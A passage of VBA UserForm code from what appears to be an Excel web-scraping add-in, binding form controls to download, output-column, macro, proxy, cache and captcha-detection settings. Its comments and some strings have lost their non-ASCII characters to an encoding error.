    Me.ListBox_Downloads.SetFocus
End Sub

Private Sub CommandButton_DeleteDownload_Click()
    On Error Resume Next
    Me.ActiveParser.Downloads.DeleteItem Me.ActiveDownload.Index
    Set Me.ActiveDownload = Nothing
    Me.Fill_Downloads_Values
    Me.ListBox_Downloads.ListIndex = Me.ListBox_Downloads.ListCount - 1
    Me.ListBox_Downloads.SetFocus
    
    Set Me.ActiveDownload = Me.ActiveParser.Downloads.GetItemByIndex(Me.ListBox_Downloads.ListIndex + 1)
    Me.Frame_SelectedDownload.Enabled = Me.ListBox_Downloads.ListIndex >= 0
    Me.MultiPage_SelectedDownload.Visible = Me.ListBox_Downloads.ListIndex >= 0
    Me.Load_ActiveDownload_Values
End Sub



Private Sub OptionButton_dfm_Auto_Click()
    On Error Resume Next
    Me.ActiveDownload.FilenameMode = dfm_Auto
    Me.OptionButton_dfm_Auto.Font.Bold = True
    Me.OptionButton_dfm_UseMask.Font.Bold = False
    Me.TextBox_DownloadSaveOptions_FilenameMask.BackColor = vbButtonFace
End Sub

Private Sub OptionButton_dfm_UseMask_Click()
    On Error Resume Next
    Me.ActiveDownload.FilenameMode = dfm_UseMask
    Me.OptionButton_dfm_Auto.Font.Bold = False
    Me.OptionButton_dfm_UseMask.Font.Bold = True
    Me.TextBox_DownloadSaveOptions_FilenameMask.BackColor = vbWindowBackground
End Sub

Private Sub Run_UpdateArrayActions_Change()
    On Error Resume Next: Me.UpdateArrayActions
End Sub
Sub UpdateArrayActions()
    On Error Resume Next: Me.Show
    FillActiveParserValues
    Me.Load_ActiveColumn_Values
    Me.Load_ActiveDownload_Values
    Me.Load_ActiveActionSet_Values
    If SETT.GetBoolean("CheckBox_AutoSaveParserFromActionsEditor") Then Me.ActiveParser.Save True
End Sub

Private Sub TextBox_ClientCertificate_Change()
    On Error Resume Next: Me.ActiveParser.Options.ClientCertificateName = Me.TextBox_ClientCertificate
End Sub

Private Sub TextBox_DownloadSaveOptions_FilenameMask_Enter()
    Me.OptionButton_dfm_UseMask.value = True
End Sub

Private Sub TextBox_DownloadSaveOptions_Folder_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ShowVariablesList Me.TextBox_DownloadSaveOptions_Folder
End Sub

Private Sub TextBox_Macro_Name_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveMacro.Name = Trim(Me.TextBox_Macro_Name)
    Me.Fill_Macros_Values
End Sub

Private Sub TextBox_MacroCode_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveMacro.code = Trim(Me.TextBox_MacroCode)
    If Me.ActiveMacro.Name = "" Then
        Dim firstname$: firstname$ = Split(Me.ActiveMacro.code, "sub ")(1)
        firstname$ = Split(firstname$, "(")(0)
        If firstname$ Like Replace(String(Len(firstname$), "-"), "-", "[A-Za-z|fffd|-|fffd||fffd|-|fffd||fffd||fffd|0-9_]") Then Me.TextBox_Macro_Name = firstname$
    End If
    Me.Fill_Macros_Values
End Sub

Private Sub TextBox_MainWorkbook_Filename_Change()
    On Error Resume Next: Me.ActiveParser.Options.Workbook_Filename = Me.TextBox_MainWorkbook_Filename
End Sub
Private Sub TextBox_MainWorkbook_SheetName_Change()
    On Error Resume Next: Me.ActiveParser.Options.Workbook_Sheetname = Me.TextBox_MainWorkbook_SheetName
End Sub

Private Sub TextBox_OC_ColumnName_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveColumn.Name = Trim(Me.TextBox_OC_ColumnName)
    Me.RefreshOutputColumnList
End Sub

Private Sub TextBox_OC_MulticolumnHeadersSuffixValue_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveColumn.MulticolumnHeadersSuffixValue = Me.TextBox_OC_MulticolumnHeadersSuffixValue
End Sub

Private Sub TextBox_OCF_CommentText_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveColumn.Format.CommentText = Me.TextBox_OCF_CommentText
End Sub

Private Sub TextBox_OCF_CommentText_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ShowVariablesList Me.TextBox_OCF_CommentText
End Sub

Private Sub TextBox_OCF_HyperlinkScreenTip_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveColumn.Format.HyperlinkScreenTip = Me.TextBox_OCF_HyperlinkScreenTip
End Sub

Private Sub TextBox_OCF_HyperlinkScreenTip_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ShowVariablesList Me.TextBox_OCF_HyperlinkScreenTip
End Sub

Private Sub TextBox_OCF_HyperlinkTextToDisplay_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveColumn.Format.HyperlinkTextToDisplay = Me.TextBox_OCF_HyperlinkTextToDisplay
End Sub

Private Sub TextBox_OCF_HyperlinkTextToDisplay_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ShowVariablesList Me.TextBox_OCF_HyperlinkTextToDisplay
End Sub

Private Sub TextBox_OCF_HyperlinkURL_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveColumn.Format.HyperlinkURL = Me.TextBox_OCF_HyperlinkURL
End Sub

Private Sub TextBox_OCF_HyperlinkURL_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ShowVariablesList Me.TextBox_OCF_HyperlinkURL
End Sub

Private Sub TextBox_OCF_RestoredHyperlinkChangeCommand_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveColumn.Format.RestoredHyperlinkChangeCommand = Me.TextBox_OCF_RestoredHyperlinkChangeCommand
End Sub

Private Sub TextBox_OCs_SearchForRow_Text_Change()
    On Error Resume Next: Me.ActiveParser.Columns.SearchForRow_Text = Me.TextBox_OCs_SearchForRow_Text
End Sub

Private Sub TextBox_PD_BasicAuthLogin_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveDownload.BasicAuthLogin = Me.TextBox_PD_BasicAuthLogin
End Sub

Private Sub TextBox_PD_BasicAuthLogin_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ShowVariablesList Me.TextBox_PD_BasicAuthLogin
End Sub

Private Sub TextBox_PD_BasicAuthPassword_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveDownload.BasicAuthPassword = Me.TextBox_PD_BasicAuthPassword
End Sub

Private Sub TextBox_PD_BasicAuthPassword_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ShowVariablesList Me.TextBox_PD_BasicAuthPassword
End Sub

Private Sub TextBox_PD_Name_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveDownload.Name = Trim(Me.TextBox_PD_Name)
    Me.Fill_Downloads_Values
End Sub

Private Sub TextBox_DownloadSaveOptions_FilenameMask_Change()
    On Error Resume Next
    Me.ActiveDownload.FilenameMask = Me.TextBox_DownloadSaveOptions_FilenameMask
End Sub

Private Sub TextBox_DownloadSaveOptions_Folder_Change()
    On Error Resume Next
    Me.ActiveDownload.Folder = Replace(Me.TextBox_DownloadSaveOptions_Folder, ROOT_FOLDER_PREFIX$, "")
End Sub

Private Sub TextBox_PD_PostAuth_Data_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveDownload.POST_Data = Me.TextBox_PD_PostAuth_Data
End Sub

Private Sub TextBox_PD_PostAuth_Data_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ShowVariablesList Me.TextBox_PD_PostAuth_Data
End Sub

Private Sub TextBox_PD_ResponseHeader_ERROR_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveDownload.ResponseHeader_ERROR = Me.TextBox_PD_ResponseHeader_ERROR
End Sub

Private Sub TextBox_PD_ResponseHeader_OK_Change()
    On Error Resume Next: If StopEvents Then Exit Sub
    Me.ActiveDownload.ResponseHeader_OK = Me.TextBox_PD_ResponseHeader_OK
End Sub

Private Sub TextBox_Protection_ReplaceWith_Change()
    On Error Resume Next: Me.ActiveParser.Protection.ReplaceWith = Me.TextBox_Protection_ReplaceWith
End Sub

Private Sub TextBox_Protection_ReplaceWith_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ShowVariablesList Me.TextBox_Protection_ReplaceWith
End Sub

Private Sub TextBox_Proxy_Check_FailMask_Change()
    On Error Resume Next: Me.ActiveParser.Proxy.Check_FailMask = Me.TextBox_Proxy_Check_FailMask
End Sub
Private Sub TextBox_Proxy_Check_HTMLfilter_Change()
    On Error Resume Next: Me.ActiveParser.Proxy.Check_HTMLfilter = Me.TextBox_Proxy_Check_HTMLfilter
End Sub
Private Sub TextBox_Proxy_Check_SuccessMask_Change()
    On Error Resume Next: Me.ActiveParser.Proxy.Check_SuccessMask = Me.TextBox_Proxy_Check_SuccessMask
End Sub
Private Sub TextBox_Proxy_Check_URL_Change()
    On Error Resume Next: Me.ActiveParser.Proxy.Check_URL = Me.TextBox_Proxy_Check_URL
End Sub

Private Sub TextBox_Proxy_StatsFilename_Change()
    On Error Resume Next: Me.ActiveParser.Proxy.StatsFilename = Trim(Me.TextBox_Proxy_StatsFilename)
End Sub

Private Sub TextBox_ProxyList_Change()
    On Error Resume Next
    ' Me.ActiveParser.Options.ProxyList = Me.TextBox_ProxyList ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Me.ActiveParser.Proxy.UpdateFromList Me.TextBox_ProxyList
End Sub

Private Sub TextBox_SheetRangeMode_Find_Text_Change()
    On Error Resume Next: Me.ActiveParser.SourceData.SheetRangeMode_Find_Text = Me.TextBox_SheetRangeMode_Find_Text
End Sub

Private Sub TextBox_SourceData_CheckColumnMask_Change()
    On Error Resume Next: Me.ActiveParser.SourceData.ColumnMode_CheckColumnMask = Me.TextBox_SourceData_CheckColumnMask
End Sub

Private Sub TextBox_SourceData_Find_Text_Change()
    On Error Resume Next: Me.ActiveParser.SourceData.FoundColumnMode_Find_Text = Me.TextBox_SourceData_Find_Text
End Sub

Private Sub TextBox_SourceData_FixedValue_Change()
    On Error Resume Next: Me.ActiveParser.SourceData.FixedValueMode_Value = Trim(Me.TextBox_SourceData_FixedValue)
End Sub

Private Sub TextBox_SourceData_FixedValue_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    If Button = 2 Then ShowVariablesList Me.TextBox_SourceData_FixedValue
End Sub

Private Sub TextBox_SourceData_Found_CheckColumnMask_Change()
    On Error Resume Next: Me.ActiveParser.SourceData.FoundColumnMode_CheckColumnMask = Me.TextBox_SourceData_Found_CheckColumnMask
End Sub

Private Sub TextBox_SourceData_MaxValue_Change()
    On Error Resume Next: Me.ActiveParser.SourceData.NumRangeMode_MaxValue = Val(Me.TextBox_SourceData_MaxValue)
End Sub

Private Sub TextBox_SourceData_MinValue_Change()
    On Error Resume Next: Me.ActiveParser.SourceData.NumRangeMode_MinValue = Val(Me.TextBox_SourceData_MinValue)
End Sub


Private Sub TextBox_SourceData_Step_Change()
    On Error Resume Next: Me.ActiveParser.SourceData.NumRangeMode_Step = Val(Me.TextBox_SourceData_Step)
End Sub

Private Sub TextBox_WP_Description_Change()
    On Error Resume Next: Me.ActiveParser.Description = Me.TextBox_WP_Description
End Sub



Private Sub ListBox_OutputColumns_Change()
    On Error Resume Next
    If Me.StopEvents Then Exit Sub
    Set Me.ActiveColumn = Nothing
    Set ActiveColumn = Me.ActiveParser.Columns.GetItemByIndex(Me.ListBox_OutputColumns.ListIndex + 1)
    Me.MultiPage_SelectedColumn.Visible = Me.ListBox_OutputColumns.ListIndex >= 0
    Me.Frame_SelectedColumn.Enabled = Me.ListBox_OutputColumns.ListIndex >= 0
    Me.Load_ActiveColumn_Values
    
    Me.CommandButton_DeleteColumn.Enabled = Me.ListBox_OutputColumns.ListIndex >= 0
    Me.CommandButton_ColumnMoveUp.Enabled = Me.ListBox_OutputColumns.ListIndex >= 0
    Me.CommandButton_ColumnMoveDown.Enabled = Me.ListBox_OutputColumns.ListIndex >= 0
    Me.CommandButton_CloneColumn.Enabled = Me.ListBox_OutputColumns.ListIndex >= 0
    
    'Dim col_num$: col_num$ = ColumnNameByColumnNumber(Me.ActiveColumn.Column)
    
    Dim arr: arr = Me.ActiveParser.GetVariablesNamesList(True)
    Me.ComboBox_OC_QS_FromVariable.list = arr
End Sub

Sub Load_ActiveDownload_Values()
    On Error Resume Next
    If ActiveDownload Is Nothing Then Exit Sub
    Me.MultiPage_SelectedDownload.Visible = True
    Me.Frame_SelectedDownload.Enabled = True
    StopEvents = True
    
    Me.MultiPage_SelectedDownload.value = 0
    With ActiveDownload
        Me.TextBox_PD_Name = .Name
        Me.ListBox_Actions_PD.list = .Actions.ToArray
        Me.CheckBox_PD_Enabled = .Enabled
        Me.CheckBox_PD_OpenFolderOnFinish = .OpenFolderOnFinish
        Me.CheckBox_PD_NeedAuth = .NeedAuth
        Me.CheckBox_PD_IgnoreErrors = .IgnoreErrors
        
        Me.TextBox_PD_ResponseHeader_OK = .ResponseHeader_OK
        Me.TextBox_PD_ResponseHeader_ERROR = .ResponseHeader_ERROR
        
        Me.CheckBox_PD_BasicAuthEnabled = .BasicAuthEnabled
        Me.TextBox_PD_BasicAuthLogin = .BasicAuthLogin
        Me.TextBox_PD_BasicAuthPassword = .BasicAuthPassword
        
        Me.CheckBox_PD_PostAuthEnabled = .POST_Enabled
        Me.TextBox_PD_PostAuth_Data = .POST_Data
        
        If .FilenameMode = dfm_Auto Then Me.OptionButton_dfm_Auto = True
        If .FilenameMode = dfm_UseMask Then Me.OptionButton_dfm_UseMask = True
        Me.TextBox_DownloadSaveOptions_FilenameMask = .FilenameMask
        
        Me.TextBox_DownloadSaveOptions_Folder = IIf((.Folder Like "\[!\]*") Or (.Folder = "\"), ROOT_FOLDER_PREFIX$ & .Folder, .Folder)
    End With
    StopEvents = False
End Sub

Sub Fill_Downloads_Values()
    On Error Resume Next
    Me.StopEvents = True
    
    Me.MultiPage_Downloads.value = 0
    Me.ListBox_Downloads.list = Me.ActiveParser.Downloads.ToArray
    Me.ListBox_Actions_PDs.list = Me.ActiveParser.Downloads.Actions.ToArray
    
    If Not ActiveDownload Is Nothing Then Me.ListBox_Downloads.ListIndex = ActiveDownload.Index - 1
    
    Me.CommandButton_DeleteDownload.Enabled = Me.ListBox_Downloads.ListIndex >= 0
    Me.CommandButton_DownloadMoveUp.Enabled = Me.ListBox_Downloads.ListIndex >= 0
    Me.CommandButton_DownloadMoveDown.Enabled = Me.ListBox_Downloads.ListIndex >= 0
    Me.CommandButton_CloneDownload.Enabled = Me.ListBox_Downloads.ListIndex >= 0
    
    Me.CommandButton_DeleteDownload.Caption = Me.CommandButton_DeleteDownload.Tag & " " & Me.ActiveDownload.Index
    Me.StopEvents = False
End Sub

Sub Load_ActiveColumn_Values()
    On Error Resume Next
    If ActiveColumn Is Nothing Then Exit Sub
    Me.MultiPage_SelectedColumn.Visible = True
    Me.Frame_SelectedColumn.Enabled = True
    StopEvents = True
    
    'Me.MultiPage_SelectedColumn.Value = 0
    With ActiveColumn
        Me.ComboBox_OC_ColumnNumber.Clear
        Me.ComboBox_OC_ColumnNumber.list = .GetFreeColumnsList(Me.ToggleButton_UnlockColumnNumbers.value)
        
        Err.Clear: Me.ComboBox_OC_ColumnNumber = ColumnNameByColumnNumber(.Column)        ' If Err Then
        
        Me.TextBox_OC_ColumnName = .Name
        Me.ListBox_Actions_OC.list = .Actions.ToArray
        Me.CheckBox_OC_Enabled = .Enabled
        Me.CheckBox_OC_OutputEnabled = .OutputEnabled
        
        Me.CheckBox_OC_MulticolumnEnabled = .MulticolumnEnabled
        Me.ComboBox_OC_MulticolumnStep = .MulticolumnStep
        'Me.CheckBox_OC_MulticolumnHeadersEnabled = .MulticolumnHeadersEnabled
        Me.ComboBox_OC_MulticolumnHeadersCount = .MulticolumnHeadersCount
        Me.CheckBox_OC_MulticolumnHeadersSuffixEnabled = .MulticolumnHeadersSuffixEnabled
        Me.TextBox_OC_MulticolumnHeadersSuffixValue = .MulticolumnHeadersSuffixValue
        
        Me.CheckBox_OC_DynamicColumns = .DynamicColumns
        Me.TextBox_OC_ColumnName.Visible = Not .DynamicColumns
        
        With .Format
            Me.CheckBox_OCF_HyperlinkEnable = .HyperlinkEnable
            Me.TextBox_OCF_HyperlinkScreenTip = .HyperlinkScreenTip
            Me.TextBox_OCF_HyperlinkTextToDisplay = .HyperlinkTextToDisplay
            Me.TextBox_OCF_HyperlinkURL = .HyperlinkURL
            
            Me.CheckBox_OCF_RestoreHyperlink = .RestoreHyperlink
            Me.TextBox_OCF_RestoredHyperlinkChangeCommand = .RestoredHyperlinkChangeCommand
            
            Select Case True
                Case .HyperlinkEnable
                    Me.TextBox_OC_ColumnName.ForeColor = vbBlue: Me.TextBox_OC_ColumnName.Font.Underline = True
                Case .RestoreHyperlink
                    Me.TextBox_OC_ColumnName.ForeColor = 8388736: Me.TextBox_OC_ColumnName.Font.Underline = True
                Case Else
                    Me.TextBox_OC_ColumnName.ForeColor = vbWindowText: Me.TextBox_OC_ColumnName.Font.Underline = False
            End Select
            
            Me.CheckBox_OCF_CommentEnable = .CommentEnable
            Me.TextBox_OCF_CommentText = .CommentText
            
            Me.CheckBox_OCF_WrapText = .WrapText
            Me.ComboBox_OCF_ColumnWidth = Format(.ColumnWidth, "0.0")
            
            Me.CheckBox_OCF_PasteImage = .PasteImage
            Me.CheckBox_OCF_PasteImage_AuthMode = .PasteImage_AuthMode
            Me.ComboBox_OCF_HeaderColor.value = Me.ActiveColumn.Format.HeaderColor
            
            Me.ComboBox_OCF_HorizontalAlignment.ListIndex = .HorizontalAlignment
        End With
    End With
    StopEvents = False
End Sub

Sub RefreshOutputColumnList()
    On Error Resume Next
    Me.StopEvents = True
    Dim TopIndex&, ind&
    ind& = Me.ListBox_OutputColumns.ListIndex
    TopIndex& = Me.ListBox_OutputColumns.TopIndex
    
    With Me.ActiveParser.Columns
        If .AutoOrder Then .CalculateColumnOrder
        Me.ListBox_OutputColumns.list = .ToArray
    End With
    
    Me.ListBox_OutputColumns.ListIndex = ind&
    Me.ListBox_OutputColumns.TopIndex = TopIndex&
    
    Me.StopEvents = False
End Sub

Sub Fill_OutputColumns_Values()
    On Error Resume Next
    Me.StopEvents = True
    Dim TopIndex&: TopIndex& = Me.ListBox_OutputColumns.TopIndex
    
    With Me.ActiveParser.Columns
        With .SheetOptions
            Me.CheckBox_FastOutput = .FastOutput
            
            Me.ComboBox_ScreenUpdatingInterval = .ScreenUpdatingInterval
            Me.ComboBox_SheetHeaderRow = .HeaderRowNumber
            Me.ComboBox_SheetBaseColumn = ColumnNameByColumnNumber(.BaseColumn)
            Me.CheckBox_OSO_ClearSheetOnStart = .ClearSheetOnStart
            Me.CheckBox_OSO_CreateNewWorkbook = .CreateNewWorkbook
            Me.CheckBox_OSO_OutputColumnsNames = .OutputColumnsNames
            Me.CheckBox_OSO_FormatColumns = .FormatColumns
            Me.CheckBox_OSO_ScrollWorksheet = .ScrollWorksheet
            Me.ComboBox_SheetZoom = .Zoom & " %"
        End With
        
        Me.CheckBox_ColumnAutoOrder = .AutoOrder
        Me.ComboBox_ColumnAutoOrder_FirstColumn = ColumnNameByColumnNumber(.AutoOrder_FirstColumn)
        
        If .AutoOrder Then .CalculateColumnOrder
        Me.ListBox_OutputColumns.list = .ToArray
        Me.ListBox_Actions_OCs.list = .Actions.ToArray
        Me.CheckBox_OutputArrayValuesToSeparateRows = .OutputArrayValuesToSeparateRows
        
        Me.CheckBox_OCs_SearchForRow = .SearchForRow
        Me.TextBox_OCs_SearchForRow_Text = .SearchForRow_Text
        Me.ComboBox_OCs_SearchForRow_Column = ColumnNameByColumnNumber(.SearchForRow_Column)
        
        If Not Me.ActiveParser.Locked Then Me.CommandButton_SaveAndCloseParser.BackColor = IIf(.OutputColumnsConflict, 8421631, 12648384)           ' red or green
    End With
    
    If Not ActiveColumn Is Nothing Then Me.ListBox_OutputColumns.ListIndex = ActiveColumn.Index - 1
    
    Me.CommandButton_DeleteColumn.Enabled = Me.ListBox_OutputColumns.ListIndex >= 0
    Me.CommandButton_ColumnMoveUp.Enabled = Me.ListBox_OutputColumns.ListIndex >= 0
    Me.CommandButton_ColumnMoveDown.Enabled = Me.ListBox_OutputColumns.ListIndex >= 0
    Me.CommandButton_CloneColumn.Enabled = Me.ListBox_OutputColumns.ListIndex >= 0
    
    '    Dim col_num$: col_num$ = ColumnNameByColumnNumber(Me.ActiveColumn.Column)
    
    Me.ListBox_OutputColumns.TopIndex = TopIndex&
    Me.StopEvents = False
End Sub

Sub Load_ActiveActionSet_Values()
    On Error Resume Next
    If ActiveActionSet Is Nothing Then Exit Sub
    Me.Frame_SelectedActionSet.Visible = True
    
    If Len(Me.ActiveActionSetID) Then
        ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        
        Dim AS_original As ActionSet, ASetSource$
        ASetSource$ = Me.ListBox_ActionSets.list(Me.ListBox_ActionSets.ListIndex, 2)
        
        Set AS_original = Me.ActiveParser.Resources.GetItemByName(ASetSource$).GetObjectByID(Me.ActiveActionSetID)
        AS_original.Index = ActiveActionSet.Index ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        
        Me.CommandButton_SaveExtraActionSet.Visible = ActiveActionSet.ExportToXML.XML <> AS_original.ExportToXML.XML
    Else
        Me.CommandButton_SaveExtraActionSet.Visible = False
    End If
    
    With ActiveActionSet
        Me.TextBox_ActionSet_Name = .Name
        StopEvents = True
        Me.ListBox_Actions_ActionSet.list = .Actions.ToArray
        StopEvents = False
    End With
End Sub

Sub Load_ActiveMacro_Values()
    On Error Resume Next
    If Me.ActiveMacro Is Nothing Then Exit Sub
    Me.Frame_SelectedMacro.Visible = True
    
    With Me.ActiveMacro
        Me.TextBox_Macro_Name = .Name
        StopEvents = True
        Me.TextBox_MacroCode = .code
        StopEvents = False
    End With
End Sub

Sub Fill_ActionSets_Values()
    On Error Resume Next
    Me.StopEvents = True
    Me.ListBox_ActionSets.list = Me.ActiveParser.AASets.ToArrayForListbox
    
    If Not Me.ActiveActionSet Is Nothing Then
        Me.ListBox_ActionSets.ListIndex = ActiveActionSet.Index - 1
    End If
    
    Me.CommandButton_DeleteActionSet.Enabled = Me.ListBox_ActionSets.ListIndex >= 0
    Me.CommandButton_ActionSet_Execute.Enabled = Me.ListBox_ActionSets.ListIndex >= 0
    Me.CommandButton_CloneActionSet.Enabled = Me.ListBox_ActionSets.ListIndex >= 0
    
    Me.StopEvents = False
End Sub

Sub Fill_Proxy_Values()
    On Error Resume Next
    Me.StopEvents = True
    With Me.ActiveParser.Proxy
        Me.TextBox_ProxyList = .ToList
        Me.CheckBox_UseProxy = .Enabled
        Me.CheckBox_ProxyShowPopup = .ShowPopup
        
        Me.ComboBox_Proxy_SwitchInCount.value = .SwitchInCount
        Me.CheckBox_Proxy_SwitchInCount_Enabled = .SwitchInCountEnabled
        Me.CheckBox_Proxy_ReconnectOnSwitch = .ReconnectOnSwitch
        
        Me.CheckBox_Proxy_Reuse.value = .Reuse
        Me.CheckBox_Proxy_SaveAddressList.value = .SaveAddressList
        
        Me.TextBox_Proxy_Check_URL = .Check_URL
        Me.TextBox_Proxy_Check_HTMLfilter = .Check_HTMLfilter
        Me.TextBox_Proxy_Check_FailMask = .Check_FailMask
        Me.TextBox_Proxy_Check_SuccessMask = .Check_SuccessMask
        
        Me.TextBox_Proxy_StatsFilename = .StatsFilename
        Me.ComboBox_Proxy_StatsClearInterval.value = CStr(.StatsClearInterval)
        Me.ComboBox_ProxyAttempts.value = CStr(.Attempts)
        
    End With
    Me.StopEvents = False
End Sub

Sub Fill_Protection_Values()
    On Error Resume Next
    Me.StopEvents = True
    With Me.ActiveParser.Protection
        Me.CheckBox_Protection_SD_Source = .SD_Source
        Me.CheckBox_Protection_SD_Actions = .SD_Actions
        Me.CheckBox_Protection_Output_Common = .Output_Common
        Me.CheckBox_Protection_Output_Actions = .Output_Actions
        Me.CheckBox_Protection_Download_Common = .Download_Common
        Me.CheckBox_Protection_Extra_Common = .Extra_Common
        Me.CheckBox_Protection_Extra_Actions = .Extra_Actions
        Me.CheckBox_Protection_ActualVersion = .ActualVersion
        Me.CheckBox_Protection_ArrayLimit = .ArrayLimit
        Me.ComboBox_Protection_ArrayLimit_Count = .ArrayLimit_Count
        Me.CheckBox_Protection_Replace = .Replace
        Me.TextBox_Protection_ReplaceWith = .ReplaceWith
        Me.ComboBox_Protection_ReplaceInterval = .ReplaceInterval
    End With
    Me.StopEvents = False
End Sub

Sub Fill_Macros_Values()
    On Error Resume Next
    Me.StopEvents = True
    Me.ListBox_Macros.list = Me.ActiveParser.Macros.ToArray
    
    If Not Me.ActiveMacro Is Nothing Then Me.ListBox_Macros.ListIndex = ActiveMacro.Index - 1
    
    Me.CommandButton_DeleteMacro.Enabled = Me.ListBox_Macros.ListIndex >= 0
    Me.CommandButton_InsertMacroIntoWorkbook.Enabled = Me.ListBox_Macros.ListIndex >= 0
    Me.CommandButton_CloneMacro.Enabled = Me.ListBox_Macros.ListIndex >= 0
    
    Me.CommandButton_DeleteMacro.Caption = Me.CommandButton_DeleteMacro.Tag & " " & Me.ActiveMacro.Index
    Me.StopEvents = False
End Sub

Sub FillActiveParserValues()
    On Error Resume Next
    Dim RF_arr, i&
    
    With Me.ActiveParser
        Me.Caption = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & .Name & "|fffd|"
        Me.TextBox_WP_Name = .Name
        Me.TextBox_WP_Description = .Description
        Me.CheckBox_WP_EnableOutputColumns.value = .Columns.Enabled
        Me.CheckBox_WP_EnableDownloads.value = .Downloads.Enabled
        Me.CheckBox_WP_Locked.value = .Locked
        Me.CommandButton_SaveAndCloseParser.BackColor = IIf(.Locked, 16761024, 12648384)
        
        Me.ComboBox_CaptchaHandler.list = .AASets.ArrayOfNamesWithExtraName(ACTION_SET_NAME_ONCAPTCHA$)
        
        With .Options
            Me.CheckBox_WP_UseCache = CBool(.UseCache)
            Me.CheckBox_WP_UseFileCache = .UseFileCache
            Me.CheckBox_WP_AnotherCache = .AnotherCache
            Me.ComboBox_AnotherCache_Name.list = AllParsers.ToArray
            Me.ComboBox_AnotherCache_Name = .AnotherCacheName
            
            Me.ComboBox_WP_Timeout = .RequestTimeout
            Me.ComboBox_WP_RetryCountOnError = .RetryCountOnError
            Me.ComboBox_WP_Pause = CStr(Replace(Round(.Pause, 1), ",", "."))
            Me.CheckBox_ShowPrInd1 = .ShowPrInd1
            Me.CheckBox_ShowPrInd2 = .ShowPrInd2
            Me.CheckBox_AutoRemoveScripts = .RemoveScripts
            Me.CheckBox_AutoRemoveIFrames = .RemoveIFrames
            Me.CheckBox_RunParserFinishOnBreak = .RunParserFinishOnBreak
            Me.CheckBox_ClearDictionaries = .ClearDictionaries
            Me.CheckBox_WP_ShowErrors = .ShowErrors
            Me.CheckBox_WP_InterruptOnError = .InterruptOnError
            Me.CheckBox_WP_NeedsOpenedWorkbook = .NeedsOpenedWorkbook
            Me.CheckBox_ClientCertificate = .UseClientCertificate
            Me.TextBox_ClientCertificate = .ClientCertificateName
            'Me.CheckBox_UseProxy = .UseProxy ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            'Me.TextBox_ProxyList = .ProxyList ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            
            Me.CheckBox_CaptchaEnabled = .CaptchaEnabled
            Me.ComboBox_CaptchaDetectionText = .CaptchaDetectionText
